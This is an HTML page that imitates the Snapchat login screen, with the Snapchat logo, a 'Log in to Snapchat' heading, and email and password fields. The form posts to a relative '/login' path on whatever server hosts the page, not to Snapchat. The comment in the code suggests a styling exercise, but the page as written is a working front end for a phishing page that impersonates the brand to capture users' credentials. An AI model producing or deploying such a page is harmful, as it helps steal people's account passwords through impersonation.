<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Snapchat Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Open Sans', sans-serif;
    }
  </style>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col items-center justify-center p-4">

  <div class="bg-white w-full max-w-sm rounded-lg shadow-md p-6 text-center">
    <!-- Snapchat logo -->
    <div class="flex justify-center mb-4">
      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="h-12 w-12">
    </div>

    <h1 class="text-xl font-semibold mb-6">Log in to Snapchat</h1>

    <!-- Your Form Code Styled with Tailwind -->
    <form action="/login" method="POST" class="text-left">
      <label class="block text-sm font-medium text-gray-700 mb-1">Email:</label>
      <input type="text" name="email" class="mb-4 block w-full rounded-md border border-gray-300 px-4 py-2 focus:ring-2 focus:ring-yellow-400 focus:outline-none" />

      <label class="block text-sm font-medium text-gray-700 mb-1">Password:</label>
      <input type="password" name="password" class="mb-4 block w-full rounded-md border border-gray-300 px-4 py-2 focus:ring-2 focus:ring-yellow-400 focus:outline-none" />

      <div class="flex justify-end mb-6">
        <a href="#" class="text-sm text-gray-500 hover:text-gray-700">Forgot Password</a>
      </div>

      <input type="submit" value="Login" class="bg-yellow-400 hover:bg-yellow-300 text-black font-semibold py-2 px-6 rounded-full w-full cursor-pointer" />
    </form>
  </div>

  <p class="mt-6 text-gray-700 text-sm">
    New To Snapchat?
    <a href="#" class="font-semibold text-black hover:underline">Sign Up</a>
  </p>

</body>
        </html>
